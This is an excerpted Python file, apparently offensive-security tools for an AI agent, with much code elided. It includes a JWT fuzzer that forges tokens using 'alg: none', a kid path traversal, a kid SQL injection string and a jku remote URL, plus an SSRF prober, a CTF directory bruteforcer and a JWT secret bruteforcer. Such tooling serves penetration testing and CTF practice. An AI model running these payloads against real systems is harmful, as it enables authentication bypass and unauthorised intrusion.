    ...
    try:
        ...
        if len(parts) != 3:
            return format_industrial_result(
                "jwt_security_fuzzer", "Error", error="Invalid JWT format"
            )
        ...
        none_header = (
            base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
            .decode()
            .strip("=")
        )
        ...
        if "kid" in header:
            ...
            kid_traversal = (
                base64.b64encode(
                    json.dumps(
                        {"alg": header.get("alg"), "kid": "../../../dev/null"}
                    ).encode()
                )
                .decode()
                .strip("=")
            ...
            variants.append(
                {
                    "type": "kid_traversal",
                    "token": f"{kid_traversal}.{parts[1]}.{parts[2]}",
                }
            )
            # SQL Injection
            kid_sqli = (
                base64.b64encode(
                    json.dumps(
                        {"alg": header.get("alg"), "kid": "' UNION SELECT 'key'--"}
                    ).encode()
                )
                .decode()
                .strip("=")
            ...
            variants.append(
                {"type": "kid_sqli", "token": f"{kid_sqli}.{parts[1]}.{parts[2]}"}
            )
        ...
        variants.append(
            {"type": "jku_remote_url", "token": f"{jku_header}.{parts[1]}.{parts[2]}"}
        )
...
async def ssrf_redirect_prober(url: str, parameter: str, **kwargs) -> str:
    ...
    try:
        ...
        return format_industrial_result(
            "ssrf_redirect_prober",
            "Timeout",
            error="Connection timed out (Possible target firewall/filtering).",
        )
    except Exception as e:
...
@tool
async def ctf_directory_bruteforcer(
    target_url: str, custom_paths: Any = None, **kwargs
) -> str:
    """
    ...
    try:
        ...
        async with httpx.AsyncClient(
            timeout=3, verify=False, follow_redirects=False
        ) as client:
        ...
        return format_industrial_result(
            "ctf_directory_bruteforcer", "Error", error=str(e)
        )
...
async def jwt_secret_bruteforcer(token: str, **kwargs) -> str:
    ...
    try:
        ...
        return format_industrial_result(
            "jwt_secret_bruteforcer", "Validation Error", error=str(e)
        )
    except Exception as e:
